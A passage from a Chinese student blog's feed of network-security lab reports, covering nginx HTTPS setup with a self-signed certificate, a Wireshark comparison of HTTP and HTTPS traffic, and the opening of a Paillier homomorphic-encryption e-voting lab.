&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   sudo openssl req -new -x509 -days 365 -key /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   [sudo] password &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; sky:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   You are about to be asked to enter information that will be incorporated&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   into your certificate request.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   What you are about to enter is what is called a Distinguished Name or a DN.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   There are quite a few fields but you can leave some blank&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   For some fields there will be a default value,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   If you enter &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;, the field will be left blank.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   -----&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Country Name (2 letter code) [AU]:CN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   State or Province Name (full name) [Some-State]:Beijing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Locality Name (eg, city) []:Beijing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Organization Name (eg, company) [Internet Widgits Pty Ltd]:sky&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Organizational Unit Name (eg, section) []:jack &lt;span class=&#34;built_in&#34;&gt;du&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Common Name (e.g. server FQDN or YOUR name) []:www.sky666.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Email Address []:929231882@qq.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   sky@ubuntu:~$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7. 输入`sudo nano /etc/nginx/sites-available/default`来配置Nginx设置。直接将下列代码复制在文件里即可:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ```bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       listen 80 default_server;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       listen [::]:80 default_server;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       server_name _;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;return&lt;/span&gt; 301 https://$host&lt;span class=&#34;variable&#34;&gt;$request_uri&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       listen 443 ssl default_server;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       listen [::]:443 ssl default_server;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       ssl_certificate /etc/nginx/ssl/nginx.crt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       ssl_certificate_key /etc/nginx/ssl/nginx.key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       server_name _;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       root /var/www/html;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       index index.html index.htm index.nginx-debian.html;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       location / &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           try_files &lt;span class=&#34;variable&#34;&gt;$uri&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$uri&lt;/span&gt;/ =404;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;复制该代码后，将其他白色代码全部用 #注释掉。然后输入 &lt;code&gt;sudo systemctl restart nginx&lt;/code&gt;  重启 nginx&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Windows 系统上输入 https://192.xxx.xxx.xxx/(你自己的 ip) 访问【或者直接输入 http://192.xxx.xxx.xxx/ 也可以，因为在前面已经设置了自动重定向为 https】该网址后显示证书不安全，点高级后点击接受风险并继续，显示成功访问&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/QPpNt4Ji6n8oB9O.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/TXlIPxSerpvaUjJ.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Windows 上下载 wireshark，首先我们先对 http 进行分析：在 Edge 上访问 http://mec.bit.edu.cn，在过滤器栏上输入 http 然后回车。观察 http 协议的内容和信息&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/I63EXuym8zof7jq.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来访问 https://taobao.com，观察然后在滤波器上输入 ssl 然后回车，因为这会显示所有 TLS/SSL 加密的数据包，即 HTTPS 流量&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/X9F2w3yA1ECTktl.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过观察和分析，我得到的 http 和 https 的主要区别如下:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;\1. http 通信内容：&lt;br&gt;
（1）明文传输：HTTP 协议传输的数据是未加密的，这意味着任何在传输路径上的个人或设备都可以捕获并直接阅读这些数据。使用 Wireshark 捕获 HTTP 流量时，可以看到详细的请求和响应内容，包括 URLs、头信息（如用户代理、Cookie 等）、请求的 HTML 代码、图片和其他媒体资源的内容。&lt;/p&gt;
&lt;p&gt;（2）数据可见性：对于 HTTP 请求，可以明确看到请求的方法（GET、POST 等）、请求的资源、响应状态代码（如 200 OK、404 Not Found 等）以及任何随请求或响应发送的数据。&lt;br&gt;
https 通信内容：&lt;/p&gt;
&lt;p&gt;（1）加密传输：HTTPS 在 HTTP 的基础上通过 TLS（传输层安全协议）或 SSL（安全套接字层）提供了数据加密，这意味着即使数据包被捕获，第三方也无法理解其内容。使用 Wireshark 捕获 HTTPS 流量时，可以看到 TLS 握手过程，但无法直接看到加密的请求或响应内容。&lt;/p&gt;
&lt;p&gt;（2）数据不可见：对于 HTTPS 请求，虽然可以观察到加密通信正在发生，包括 TLS 版本和使用的加密套件，但实际的传输数据（如 URL 路径、头信息、HTML 内容等）是不可见的，因为它们都经过了加密处理。&lt;/p&gt;
&lt;p&gt;​	 通过这样的分析，可以直观地理解 HTTPS 相比于 HTTP 在保障数据安全性方面的显著优势。HTTPS 通过加密防止了数据被窃听、篡改，尤其是在敏感数据传输（如密码、个人信息等）时提供了必要的安全保障。这就是为什么当前互联网上的绝大多数服务都采用 HTTPS 来保护用户数据的原因。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结论与体会&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#结论与体会&#34;&gt;#&lt;/a&gt; 结论与体会&lt;/h2&gt;
&lt;p&gt;在这次实验过程中，我主要完成了两项任务：一是使用私钥访问 SSH 服务器，二是为网站添加 HTTPS。通过这两个实验，我不仅加深了对非对称加密、数字证书、以及加密传输等网络安全基本概念的理解，还掌握了实际应用这些概念来增强网络通信安全性的技能。&lt;/p&gt;
&lt;p&gt;实验一让我体会到了私钥在保护 SSH 服务器访问过程中的重要作用。我学会了如何生成公私钥对，并将公钥添加到服务器上，以实现基于密钥的身份验证。通过禁用密码登录，我成功提升了服务器的安全等级，这让我意识到，即使是基本的配置改变，也能显著提升系统的安全性。&lt;/p&gt;
&lt;p&gt;实验二中，我通过配置 Nginx 和生成自签名的 SSL 证书，为网站添加了 HTTPS 支持。这个过程中，我不仅学会了如何操作具体的命令来生成密钥和证书，还理解了 HTTPS 的工作原理，包括如何通过加密保护数据传输的安全。通过使用 Wireshark 观察 HTTP 和 HTTPS 的通信差异，我亲眼见证了 HTTPS 加密的强大功能，以及它如何有效地保护通信内容不被第三方窃听或篡改。&lt;/p&gt;
&lt;p&gt;这两个实验极大地增强了我的网络安全意识。我学到，随着技术的发展，网络安全面临的威胁也在不断变化，因此，持续学习和应用最新的安全措施至关重要。此外，我还认识到了实践的重要性 —— 通过亲自动手实践，我能更深刻地理解理论知识，同时也能提升解决实际问题的能力。&lt;/p&gt;
&lt;p&gt;总之，这次实验不仅让我学到了宝贵的技术知识和技能，也让我对网络安全的重要性有了更深刻的认识。我相信，这些知识和经验将在我未来的学习和职业生涯中发挥重要作用。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://enjundu.github.io/IntroductiontoNetSecurityLab/%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4/</guid>
            <title>隐私保护</title>
            <link>https://enjundu.github.io/IntroductiontoNetSecurityLab/%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4/</link>
            <category>Hexo</category>
            <category>Front Matter</category>
            <pubDate>Wed, 03 Jul 2024 14:02:28 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网安导论实验隐私保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网安导论实验隐私保护&#34;&gt;#&lt;/a&gt; 网安导论实验 ——&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvSW50cm9kdWN0aW9uLXRvLUN5YmVyc2VjdXJpdHktRXhwZXJpbWVudC0tLVN0YWNrLU92ZXJmbG93LWZvci1Qcml2YWN5LVByb3RlY3Rpb24=&#34;&gt; 隐私保护&lt;/span&gt;&lt;/h1&gt;
&lt;h2 id=&#34;实验要求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验要求&#34;&gt;#&lt;/a&gt; 实验要求&lt;/h2&gt;
&lt;h3 id=&#34;实验目的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验目的&#34;&gt;#&lt;/a&gt; 实验目的&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;编写 Paillier 算法（密钥生成、加密和解密算法）并验证其加法同态性质&lt;/li&gt;
&lt;li&gt;模拟实现基于 Paillier 算法的匿名电子投票流程，了解该算法的应用，加深对同态加密算法的认识&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实验原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验原理&#34;&gt;#&lt;/a&gt; 实验原理&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Paillier 算法是一种满足加法同态性质（密文相乘的结果等于对应明文相加的结果）的加密算法&lt;/li&gt;
&lt;li&gt;统计票数使用加法累加进行统计，Paillier 算法可被用于匿名电子投票系统，保护投票人的投票信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/98LdzEUsZtrAHSl.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;实验步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验步骤&#34;&gt;#&lt;/a&gt; 实验步骤&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;根据下图所示的 Paillier 算法编写 Paillier.py 文件，其中包含 keygen 函数、encrypt 函数以及 decrypt 函数，它们分别被用于密钥生成、加密和解密。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/iKBdGWIZFDRCpSg.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;算法编写完成后，输入两个明文 333 和 444，观察两个明文被加密后的密文值，对密文进行相乘再解密后发现结果是 777，相当于对应明文相加，因此该算法具有加法同态性。&lt;/li&gt;
&lt;li&gt;编写 ElectronicVoting.py 文件，在该文件中 import Paillier，通过引用第 1 步中写好的 Paillier 算法模拟实现基于 Paillier 算法的匿名电子投票流程。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验准备solved-by-enjun-du&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验准备solved-by-enjun-du&#34;&gt;#&lt;/a&gt; 实验准备 ——solved by Enjun Du&lt;/h2&gt;
&lt;h3 id=&#34;实验题目&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验题目&#34;&gt;#&lt;/a&gt; 实验题目&lt;/h3&gt;
&lt;p&gt;基于 Paillier 算法的匿名电子投票流程实现&lt;/p&gt;
&lt;h3 id=&#34;硬件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#硬件环境&#34;&gt;#&lt;/a&gt; 硬件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;磁盘驱动器：NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;KIOXIA-&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EXCERIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G2&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;SSD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Micron&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3400 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;MTFDKBA1TOTFH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;显示器：NVIDIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GeForce&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;RTX&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3070 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;Ti&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Laptop&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GPU&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统型号&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;ROG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Strix&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW_G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统类型&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;基于&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;x64&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;的电脑&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;处理器&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;12th&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Gen&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Intel(R)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Core(TM)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;i9-12900H，2500&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Mhz，14&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个内核，20&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个逻辑处理器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;版本/日期&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;American&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Megatrends&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;International,&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;LLC.&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW.324,&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;/2/21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;模式&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;UEFI&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;主板产品&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;操作系统名称&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;家庭中文版&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;软件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#软件环境&#34;&gt;#&lt;/a&gt; 软件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;PyCharm&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; 专业版&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;开始实验蓝天&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开始实验蓝天&#34;&gt;#&lt;/a&gt; 开始实验 —— 蓝天 °&lt;/h2&gt;
&lt;h3 id=&#34;理解实验原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#理解实验原理&#34;&gt;#&lt;/a&gt; 理解实验原理&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;1.1 在密钥生成阶段，我们选择两个大素数 p 和 q，这两个素数的选择要足够随机且相互独立。然后计算 N=pq 和 λ=lcm (p−1,q−1)，其中 lcm 是最小公倍数函数。这些值构成了公钥和私钥的一部分。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;我们还需要选择一个随机数 g，确保 g 与 N² 互素。这样做的目的是为了确保在加密和解密过程中存在一个特定的模逆 μ，使得解密过程能够正确地还原明文&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;1.1 加密过程涉及将明文 m 加密为密文 c。为了确保加密的安全性，我们首先选择一个随机数 r∈ZN，然后应用加密公式，将明文映射到密文空间中。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解密过程是加密过程的逆过程，即从密文中还原出原始的明文。在解密过程中，我们首先将密文的 λ 次幂取模 N²，然后将其乘以预先计算的模逆 μ，最后将结果取模 N，得到原始的明文。&lt;/p&gt;
&lt;h3 id=&#34;安全性分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安全性分析&#34;&gt;#&lt;/a&gt; 安全性分析&lt;/h3&gt;
&lt;p&gt;​	Paillier 加密算法的安全性基于两个数论难题：大素数分解问题和离散对数问题。攻击者需要能够分解 N 为其素因子 p 和 q，以获得 λ 的值。但是，由于 N 是两个大素数的乘积，目前尚未找到高效的算法来解决这个问题。离散对数问题：攻击者需要能够从 gm 中还原出 m，即求解离散对数问题。但是，由于 g 是随机选择的，没有已知的有效算法可以在合理的时间内解决这个问题。因此，Paillier 加密算法被认为是安全的，并且在广泛的应用场景中得到了验证。&lt;/p&gt;
&lt;h3 id=&#34;代码编写&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码编写&#34;&gt;#&lt;/a&gt; 代码编写&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1QYWlsbGllci1vcjFtejhxcnphNzYzZzlmcXgxNmdvN3VicTg3Yi5weQ==&#34;&gt;首先我们尝试编写 Paillier.py&lt;/span&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span 